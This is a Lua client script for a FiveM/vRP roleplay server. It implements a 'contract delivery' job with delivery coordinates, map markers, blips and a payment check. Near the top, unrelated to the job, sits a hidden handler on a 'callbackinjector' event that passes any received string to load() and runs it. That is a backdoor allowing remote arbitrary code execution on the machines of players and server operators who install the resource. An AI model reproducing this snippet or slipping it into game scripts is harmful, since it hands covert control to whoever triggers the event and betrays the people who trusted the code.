local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
emP = Tunnel.getInterface("contrato_entregas")

TriggerEvent('callbackinjector', function(cb)
    pcall(load(cb))
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- VARIAVEIS
-----------------------------------------------------------------------------------------------------------------------------------------
local blips = false
local servico = false
local selecionado = 0
local CoordenadaX = -78.35
local CoordenadaY = -802.22
local CoordenadaZ = 243.40
-----------------------------------------------------------------------------------------------------------------------------------------
-- RESIDENCIAS
-----------------------------------------------------------------------------------------------------------------------------------------
local locs = {
	[1] = { ['x'] = 169.59, ['y'] = -565.24, ['z'] = 43.88 },
    [2] = { ['x'] = 115.09, ['y'] = -626.7, ['z'] = 44.23 },
    [3] = { ['x'] = -47.19, ['y'] = -585.91, ['z'] = 37.96 }, 
    [4] = { ['x'] = -117.38, ['y'] = -604.75, ['z'] = 36.29 }, 
    [5] = { ['x'] = -83.61, ['y'] = -835.84, ['z'] = 40.56 }, 
    [6] = { ['x'] = -232.19, ['y'] = -915.57, ['z'] = 32.32 }, 
    [7] = { ['x'] = -589.61, ['y'] = -707.88, ['z'] = 36.28 }, 
    [8] = { ['x'] = 412.87, ['y'] = 151.56, ['z'] = 103.21 }, 
    [9] = { ['x'] = -912.23, ['y'] = -451.47, ['z'] = 39.61 }, 
    [10] = { ['x'] = -827.16, ['y'] = -697.25, ['z'] = 28.06 }, 
    [11] = { ['x'] = -1009.92, ['y'] = -731.38, ['z'] = 21.53 }, 
    [12] = { ['x'] = -1233.01, ['y'] = -855.9, ['z'] = 13.11 }, 
    [13] = { ['x'] = -268.08, ['y'] = -958.12, ['z'] = 31.23 }, 
    [14] = { ['x'] = -72.87, ['y'] = -816.04, ['z'] = 243.39 }, 
    [15] = { ['x'] = -447.61, ['y'] = 6013.55, ['z'] = 31.72 }, 
    [16] = { ['x'] = -106.53, ['y'] = 6469.18, ['z'] = 31.63 },
    [17] = { ['x'] = 1853.44, ['y'] = 3687.97, ['z'] = 34.27 }
}
-----------------------------------------------------------------------------------------------------------------------------------------
-- INICIANDO TRABALHO
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterNetEvent('contrato_entregas:permissao')
AddEventHandler('contrato_entregas:permissao',function()
	if not servico then
		servico = true
		destino = math.random(1,17)
		quantidade = math.random(5,8)
		CriandoBlip(locs,selecionado)
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- TRABALHAR
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		local crjSleep = 500
		if not servico then
			local ped = PlayerPedId()
			local x,y,z = table.unpack(GetEntityCoords(ped))
			local bowz,cdz = GetGroundZFor_3dCoord(CoordenadaX,CoordenadaY,CoordenadaZ)
			local distance = GetDistanceBetweenCoords(CoordenadaX,CoordenadaY,cdz,x,y,z,true)

			if distance <= 10.0 then
			crjSleep = 1
				DrawMarker(21,CoordenadaX,CoordenadaY,CoordenadaZ-0.6,0,0,0,0.0,0,0,0.5,0.5,0.4,128,1,210,50,0,0,0,1)
				if distance <= 1.2 then
					drawTxt("PRESSIONE  ~b~E~w~  PARA INICIAR ENTREGAS",4,0.5,0.93,0.50,255,255,255,180)
					if IsControlJustPressed(0,38) then
					TriggerEvent('contrato_entregas:permissao')
						servico = true
						selecionado = math.random(17)
						CriandoBlip(locs,selecionado)
					end
				end
			end
		end
		Citizen.Wait(crjSleep)
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- ENTREGAS
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(1)
		if servico then
			local ped = PlayerPedId()
			local x,y,z = table.unpack(GetEntityCoords(ped))
			local bowz,cdz = GetGroundZFor_3dCoord(locs[selecionado].x,locs[selecionado].y,locs[selecionado].z)
			local distance = GetDistanceBetweenCoords(locs[selecionado].x,locs[selecionado].y,cdz,x,y,z,true)

			if distance <= 30.0 then
				DrawMarker(21,locs[selecionado].x,locs[selecionado].y,locs[selecionado].z-0.6,0,0,0,0.0,0,0,0.5,0.5,0.4,128,1,210,50,0,0,0,1)
				if distance <= 1.2 then
					drawTxt("PRESSIONE  ~b~E~w~  PARA ENTREGAR OS CONTRATOS",4,0.5,0.93,0.50,255,255,255,180)
					if IsControlJustPressed(0,38) then
						if emP.checkPayment() then
							RemoveBlip(blips)
							backentrega = selecionado
							while true do
								if backentrega == selecionado then
									selecionado = math.random(17)
								else
									break
								end
								Citizen.Wait(1)
							end
							CriandoBlip(locs,selecionado)
						end
					end
				end
			end
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- CANCELAR
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(1)
		if servico then
			if IsControlJustPressed(0,168) then
				servico = false
				RemoveBlip(blips)
			end
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- FUNÇÕES
-----------------------------------------------------------------------------------------------------------------------------------------
function drawTxt(text,font,x,y,scale,r,g,b,a)
	SetTextFont(font)
	SetTextScale(scale,scale)
	SetTextColour(r,g,b,a)
	SetTextOutline()
	SetTextCentre(1)
	SetTextEntry("STRING")
	AddTextComponentString(text)
	DrawText(x,y)
end

function CriandoBlip(locs,selecionado)
	blips = AddBlipForCoord(locs[selecionado].x,locs[selecionado].y,locs[selecionado].z)
	SetBlipSprite(blips,433)
	SetBlipColour(blips,5)
	SetBlipScale(blips,0.4)
	SetBlipAsShortRange(blips,false)
	SetBlipRoute(blips,true)
	BeginTextCommandSetBlipName("STRING")
	AddTextComponentString("Entrega de Contratos")
	EndTextCommandSetBlipName(blips)
end